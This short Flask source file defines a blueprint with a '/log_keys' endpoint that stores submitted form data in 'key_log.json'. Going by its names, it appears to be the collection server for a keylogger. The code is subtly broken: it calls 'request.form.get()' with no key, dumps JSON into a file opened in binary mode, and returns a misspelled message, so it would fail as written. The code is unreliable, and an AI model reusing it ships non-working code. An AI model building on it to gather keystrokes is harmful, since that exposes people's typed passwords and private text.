from flask import Flask, jsonify, request #Flask imports
from flask import Blueprint, render_template, redirect #Flask import to re-route requests on server
from app import db
import json

key_log = Blueprint('key_log', __name__)

@key_log.route("/log_keys", methods=["POST","GET"])
def log():

    data = request.form.get()
        
    with open('key_log.json', 'wb') as f:
        json.dump(data, f, indent=2)
    
    return("sucsess!")


    